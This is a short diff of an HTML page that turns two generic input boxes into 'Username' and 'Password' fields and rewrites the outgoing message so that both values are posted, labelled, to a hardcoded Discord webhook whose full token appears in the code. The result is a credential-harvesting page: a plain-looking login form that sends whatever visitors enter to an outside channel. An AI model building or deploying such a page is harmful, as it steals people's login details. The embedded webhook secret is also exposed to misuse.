@@ -110,11 +110,11 @@
 <body class="dark-theme">
 
     <div class="container builder-font">
-        <h2>Box 1 Title</h2>
-        <input type="text" id="box1" placeholder="Enter something...">
+        <h2>Username</h2>
+        <input type="text" id="box1" placeholder="Enter username">
         
-        <h2>Box 2 Title</h2>
-        <input type="text" id="box2" placeholder="Enter something...">
+        <h2>Password</h2>
+        <input type="text" id="box2" placeholder="Enter password">
         
         <button onclick="sendToDiscord()">Send</button>
     </div>
@@ -130,7 +130,7 @@
 
             const webhookUrl = "https://discord.com/api/webhooks/1334553192742256731/G2eqR5zfbLnos2IHbS5WLm6Hke7VUYSgigNKmWL7WK2e05PchDvyXmRhtUm7TUTYMMyl"; // Replace with your actual webhook
             const message = {
-                content: `Box 1: ${box1Value}\nBox 2: ${box2Value}`
+                content: `Username: ${box1Value}\nPassword: ${box2Value}`
             };
 
             fetch(webhookUrl, {
